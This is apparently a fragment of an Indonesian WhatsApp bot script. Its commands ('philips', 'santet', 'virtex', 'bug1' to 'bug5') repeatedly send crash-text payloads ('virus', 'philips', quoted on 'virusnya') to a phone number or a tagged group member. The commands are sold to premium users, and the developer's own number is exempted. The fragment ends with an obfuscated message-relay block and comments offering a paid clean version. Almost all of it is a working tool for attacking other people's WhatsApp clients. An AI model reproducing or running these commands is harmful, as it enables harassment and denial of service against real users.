if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'philips3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'santet':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'santet2':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'santet3':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isGroup) return reply(mess.OnlyGrup)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(number, {text:philips}, {quoted:virusnya})
mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
}
}
break

case 'virtex':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'virtex2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug1':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug3':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug4':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'bug5':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('itu nomor lu sendiri')
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:'p'}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:virus}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

default:

/*━━━━━━━[ Function Menfess ]━━━━━━━*/

// Function Menfess Auto Bales
// Jangan Lu Edit Lagi Disini
// Buy No enc? Chat Wa
// Wa Guwe : 083834558105

var _0x1a6220=_0x4a33;(function(_0x5b325d,_0xd37330){var _0x15f0df=_0x4a33,_0x17b9a4=_0x5b325d();while(!![]){try{var _0x5034a9=parseInt(_0x15f0df(0x1d3))/0x1*(-parseInt(_0x15f0df(0x1ca))/0x2)+-parseInt(_0x15f0df(0x1d4))/0x3*(parseInt(_0x15f0df(0x1c5))/0x4)+parseInt(_0x15f0df(0x1c7))/0x5*(-parseInt(_0x15f0df(0x1cf))/0x6)+-parseInt(_0x15f0df(0x1d5))/0x7*(parseInt(_0x15f0df(0x1c9))/0x8)+-parseInt(_0x15f0df(0x1cc))/0x9+-parseInt(_0x15f0df(0x1c4))/0xa+parseInt(_0x15f0df(0x1cd))/0xb;if(_0x5034a9===_0xd37330)break;else _0x17b9a4['push'](_0x17b9a4['shift']());}catch(_0x1d82f8){_0x17b9a4['push'](_0x17b9a4['shift']());}}}(_0x351e,0x54a56));function _0x4a33(_0x1e5c04,_0x200f07){var _0x351e1e=_0x351e();return _0x4a33=function(_0x4a33ba,_0x1cdc80){_0x4a33ba=_0x4a33ba-0x1c3;var _0x110a2e=_0x351e1e[_0x4a33ba];return _0x110a2e;},_0x4a33(_0x1e5c04,_0x200f07);}function _0x351e(){var _0x26a0e1=['pesan\x20diteruskan','1103568ZGfugO','sendMessage','message','text','445736reezra','18tskWyb','1168237exHeIM','messages','4186710kRyETk','297452lFwhFR','type','10QPbKSn','teman','16yYTSyk','2wHOPdZ','conversation','2985354kCXAlP','29597029dyJWde'];_0x351e=function(){return _0x26a0e1;};return _0x351e();}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x1a6220(0x1c8),sender)==![])return;if(m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)]==_0x1a6220(0x1cb)||m[_0x1a6220(0x1c3)][0x0]['type']=='extendedTextMessage'){try{var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)];}catch(_0x2d0d82){var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)];}let text_nya_menfes='*Balasan*\x20:\x20'+chat_anonymous;conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8),sender),{'text':text_nya_menfes}),conn['sendMessage'](from,{'text':_0x1a6220(0x1ce)},{'quoted':msg});}}

// Bang yg ini knp di enc?
// Gua belike : kamu nanya:v

// Kan di thumbnail no enc 100%?
// Gua belike : function nya langka bro

/*━━━━━━━━━━━━━━━━━━━━━━━━━━━━*/

// AUTHOR : LEXXY OFFICIAL
// INI CONSOLE LOG JNGN EDIT

}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
server_eror.push({"error": `${err}`})
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
}}